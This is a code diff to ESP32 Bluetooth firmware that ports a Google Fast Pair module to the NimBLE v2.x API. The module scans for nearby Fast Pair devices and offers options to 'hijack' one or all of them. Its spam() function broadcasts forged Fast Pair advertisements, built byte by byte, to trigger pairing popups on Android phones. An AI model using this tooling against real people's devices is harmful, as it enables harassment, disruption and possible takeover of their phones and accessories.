@@ -10,7 +10,6 @@
 #include "fast_pair_keys.h"
 #include "display_manager.h"
 #include "input_handling.h"
-#include "task_manager.h"
 #include "constants.h"
 
 #include <NimBLEDevice.h>
@@ -184,18 +183,11 @@ void FastPair::command(const char* args) {
 }
 
 // ── FastPair::scan() ──────────────────────────────────────────────────────────
-// Scan task runs start(5, false) in its own FreeRTOS task (same pattern as sbl).
-// Calling start() with any duration on the main task blocks via ulTaskNotifyTake
-// which with duration=0 waits indefinitely → watchdog crash.
-static void fpScanTaskFn(void* param) {
-    NimBLEScan* scan = static_cast<NimBLEScan*>(param);
-    scan->start(5, false);
-    TaskManager::taskRunning = false;
-    vTaskDelete(nullptr);
-}
+// NimBLE v2.x: start() is non-blocking — returns immediately and fires callbacks
+// from the BLE host task.  Drive the timeout with millis() on the main task.
 
-class FpScanCb : public NimBLEAdvertisedDeviceCallbacks {
-    void onResult(NimBLEAdvertisedDevice* dev) override {
+class FpScanCb : public NimBLEScanCallbacks {
+    void onResult(const NimBLEAdvertisedDevice* dev) override {
         if (s_fpCount >= 32) return;
         if (!dev->haveServiceData()) return;
         std::string sd = dev->getServiceData(NimBLEUUID("FE2C"));
@@ -220,12 +212,12 @@ class FpScanCb : public NimBLEAdvertisedDeviceCallbacks {
 void FastPair::scan() {
     DisplayManager& dm = displayManager;
 
-    NimBLEDevice::init("");   // idempotent — same as sbl, no deinit needed
+    NimBLEDevice::init("");
     s_fpCount = 0; s_scanDone = false;
 
     static FpScanCb cb;
     NimBLEScan* pScan = NimBLEDevice::getScan();
-    pScan->setAdvertisedDeviceCallbacks(&cb, false);
+    pScan->setScanCallbacks(&cb, false);
     pScan->setActiveScan(true);
     pScan->setInterval(100); pScan->setWindow(99);
     pScan->clearResults();
@@ -238,28 +230,28 @@ void FastPair::scan() {
     dm.setTextColor(0x7BEF); dm.println("]");
     dm.printSeparator();
 
-    // Spawn 5-second blocking scan in its own task (start() blocks the sub-task, not main)
-    TaskManager::start(fpScanTaskFn, "fpscan", pScan, TASK_STACK_DEFAULT, 0);
+    // NimBLE v2.x start() is non-blocking — drive timeout with millis()
+    pScan->start(0);   // 0 = continuous; we call stop() after SCAN_MS
 
+    const uint32_t SCAN_MS = 5000;
     const char spinner[] = "|/-\\";
-    uint32_t frame = 0; bool aborted = false;
-    while (TaskManager::isRunning()) {
-        char buf[44];
-        snprintf(buf, sizeof(buf), "Scanning FP... %c  found:%d",
-                 spinner[frame++ % 4], (int)s_fpCount);
+    uint32_t frame = 0, t0 = millis();
+    bool aborted = false;
+
+    while (millis() - t0 < SCAN_MS) {
+        uint32_t elapsed = (millis() - t0) / 1000;
+        char buf[48];
+        snprintf(buf, sizeof(buf), "Scanning FP... %c  %lus  found:%d",
+                 spinner[frame++ % 4], (unsigned long)elapsed, (int)s_fpCount);
         dm.fillRect(10, outputY + LINE_HEIGHT, SCREEN_WIDTH - 10, LINE_HEIGHT, TFT_BLACK);
         dm.setCursor(10, outputY + LINE_HEIGHT); dm.setTextColor(TFT_CYAN);
         dm.printText(buf);
         vTaskDelay(pdMS_TO_TICKS(100));
-        if (inputHandler.getKeyboardInput() == 'q') {
-            pScan->stop();
-            TaskManager::requestStop();
-            aborted = true;
-            break;
-        }
+        if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
     }
-    TaskManager::cleanup();
-    pScan->setAdvertisedDeviceCallbacks(nullptr);
+
+    pScan->stop();
+    pScan->setScanCallbacks(nullptr);
     pScan->clearResults();
 
     if (aborted) { dm.printCommandScreen(); return; }
@@ -277,6 +269,10 @@ void FastPair::scan() {
     const int perPage = 10; int page = 0;
     while (true) {
         renderFpPage(page, perPage, (int)s_fpCount);
+        // Capture cursor Y immediately after render — before any status-bar
+        // update can move the TFT cursor to y<30 and corrupt getCursorY().
+        int32_t promptY = dm.getCursorY();
+        if (promptY < outputY) promptY = SCREEN_HEIGHT - LINE_HEIGHT * 2;
         int tp = max(1, ((int)s_fpCount + perPage - 1) / perPage);
         while (true) {
             char k = inputHandler.getKeyboardInput();
@@ -285,7 +281,8 @@ void FastPair::scan() {
             if (k == 's' || k == 'S') { spam(); return; }
             if (k == 'A') { hijackAll(); return; }
             if (k == 'h' || k == 'H') {
-                dm.setCursor(10, dm.getCursorY());
+                dm.fillRect(0, promptY, SCREEN_WIDTH, LINE_HEIGHT + 2, TFT_BLACK);
+                dm.setCursor(10, promptY);
                 dm.setTextColor(TFT_CYAN); dm.printText("Hijack #: ");
                 uint32_t t = millis(); int idx = -1;
                 while (millis() - t < 5000) {
@@ -332,14 +329,14 @@ void FastPair::spam() {
         // Exact BruceDevices format: UUID list + service data only (no TX power)
         std::string uuidAd; uuidAd += (char)0x03; uuidAd += (char)0x03;
                             uuidAd += (char)0x2C; uuidAd += (char)0xFE;
-        advData.addData(uuidAd);
+        advData.addData((const uint8_t*)uuidAd.data(), uuidAd.size());
 
         std::string sdAd; sdAd += (char)0x06; sdAd += (char)0x16;
                           sdAd += (char)0x2C; sdAd += (char)0xFE;
                           sdAd += (char)(mid >> 16);
                           sdAd += (char)(mid >> 8);
                           sdAd += (char)(mid & 0xFF);
-        advData.addData(sdAd);
+        advData.addData((const uint8_t*)sdAd.data(), sdAd.size());
 
         pAdv->setAdvertisementData(advData);
         pAdv->setMinInterval(32); pAdv->setMaxInterval(48);
@@ -353,7 +350,7 @@ void FastPair::spam() {
         dm.setCursor(10, dm.getCursorY()); dm.setTextColor(0x7BEF); dm.println("[q]=stop");
 
         uint32_t t = millis(); bool done = false;
-        while (millis() - t < 4000) {  // 4s: FP popup can take a moment
+        while (millis() - t < 10000) {  // 10s — Android needs time to show FP popup
             if (inputHandler.getKeyboardInput() == 'q') { done = true; break; }
             vTaskDelay(pdMS_TO_TICKS(50));
         }
@@ -361,10 +358,9 @@ void FastPair::spam() {
         if (done) break;
         i++;
     }
-    // Restore NimBLE for subsequent commands
+    // Teardown — do NOT reinit; next BLE command inits from clean state
     NimBLEDevice::deinit(true);
-    vTaskDelay(pdMS_TO_TICKS(50));
-    NimBLEDevice::init("T-REX");
+    vTaskDelay(pdMS_TO_TICKS(100));
     fpSdRemount(); dm.printCommandScreen();
 }
 
